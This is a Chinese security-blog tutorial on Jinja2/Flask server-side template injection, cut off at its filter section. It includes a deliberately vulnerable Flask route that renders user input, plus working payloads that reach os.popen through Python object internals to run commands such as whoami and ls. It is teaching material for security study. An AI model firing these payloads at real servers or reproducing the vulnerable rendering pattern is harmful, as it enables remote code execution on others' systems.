---
title: SSTI之细说jinja2的常用构造及利用思路
url: https://www.secpulse.com/archives/198454.html
source: 安全脉搏
date: 2023-04-05
fetch_date: 2025-10-04T11:29:23.409108
---

# SSTI之细说jinja2的常用构造及利用思路

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SSTI之细说jinja2的常用构造及利用思路

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-04-04

14,253

现在关于ssti注入的文章数不胜数，但大多数是关于各种命令语句的构造语句，且没有根据版本、过滤等具体细分，导致读者可能有一种千篇一律的感觉。所以最近详细整理了一些SSTI常用的payload、利用思路以及题目，谨以结合题目分析以及自己的理解给uu们提供一些参考，如有写错的地方，还望大佬们轻喷。

在介绍下ssti(服务端模板注入)的具体成因及案例之前，有必要先引入模板引擎的概念。

## 模板引擎介绍

模板引擎（这里特指用于Web开发的模板引擎）是为了使**用户界面与业务数据（内容）分离**而产生的，它可以生成特定格式的文档，**用于网站的模板引擎就会生成一个标准的HTML文档**。 其不属于特定技术领域，它是**跨领域跨平台的概念**。在Asp下有模板引擎，在PHP下也有模板引擎，在C#下也有，甚至JavaScript、WinForm开发都会用到模板引擎技术。模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。

## SSTI(服务端模板注入)攻击

SSTI（server-side template injection)为服务端模板注入攻击，它主要是由于框架的不规范使用而导致的。主要为python的一些框架，如 jinja2 mako tornado django flask、PHP框架smarty twig thinkphp、java框架jade velocity spring等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，**模板渲染其实并没有漏洞**，主要是程序员**对代码不规范不严谨**造成了模板注入漏洞，造成模板可控。注入的原理可以这样描述：**当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑**。

各框架模板结构如下图所示：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image.png "image.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image.png)

## 实例

这里使用python的flask框架测试ssti注入攻击的过程。

```
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route('/ssti', methods=['GET', 'POST'])
def sb():
    template = '''
        <div class="center-content error">
            <h1>This is ssti! %s</h1>
        </div>
    ''' % request.args["x"]

    return render_template_string(template)

if __name__ == '__main__':
    app.debug = True
    app.run()
```

本地测试如下：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image1-1024x469.png "image1-1024x469.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image1.png)

发现存在模板注入

获得字符串的type实例

```
?name={{"".__class__}}
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image4-1024x440.png "image4-1024x440.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image4.png)

这里使用的置换型模板，将字符串进行简单替换，其中参数`x`的值完全可控。发现模板引擎成功解析。说明模板引擎并不是将我们输入的值当作字符串，而是当作代码执行了。

`{{}}`在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把`{{}}`包裹的内容当做变量解析替换。比如`{{1+1}}`会被解析成`2`。如此一来就可以实现如同sql注入一样的注入漏洞。

以flask的jinja2引擎为例，官方的模板语法如下：

> {% ... %} 用于声明，比如在使用for控制语句或者if语句时
>
> {{......}} 用于打印到模板输出的表达式，比如之前传到到的变量（更准确的叫模板上下文）,例如上文 '1+1' 这个表达式
>
> `{# ... #}` 用于模板注释
>
> `# ... ##` 用于行语句，就是对语法的简化
>
> #...#可以有和{%%}相同的效果

由于参数完全可控，则攻击者就可以通过精心构造恶意的 Payload 来让服务器执行任意代码，造成严重危害。下图通过 SSTI 命令执行成功执行 whoami 命令：

```
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image5-1024x298.png "image5-1024x298.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/image5.png)

可以看到命令被成功执行了。下面讲下构造的思路：

一开始是通过class通过 **base** 拿到object基类，接着利用 **subclasses**() 获取对应子类。在全部子类中找到被重载的类即为可用的类，然后通过**init**去获取**globals**全局变量，接着通过**builtins**获取eval函数，最后利用popen命令执行、read()读取即可。

上述构造及实例没有涉及到过滤，不需要考虑绕过，所以只是ssti注入中较简单的一种。但是当某些字符或者关键字被过滤时，情况较为复杂。实际上不管对于哪种构造来说，都离不开最基本也是最常用的方法。下面是总结的一些常用到的利用方法和过滤器。

## 常用的方法

```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              查看继承关系和调用顺序，返回元组。此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身.
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
dict.get(key, default=None) 返回指定键的值，如果值不在字典中返回default值
dict.setdefault(key, default=None) 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。
此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1      get传参
request.values.x1    所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1      post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data         post传参 (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
[].__class__.__base__
''.__class__.__mro__[2]
().__class__.__base__
{}.__class__.__base__
request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
或者
[].__class__.__bases__[0]       //其他的类似
__new__功能：用所给类创建一个对象，并且返回这个对象。
```

## 常用的过滤器

详细说明可以参考官方文档：<https://jinja.palletsproje...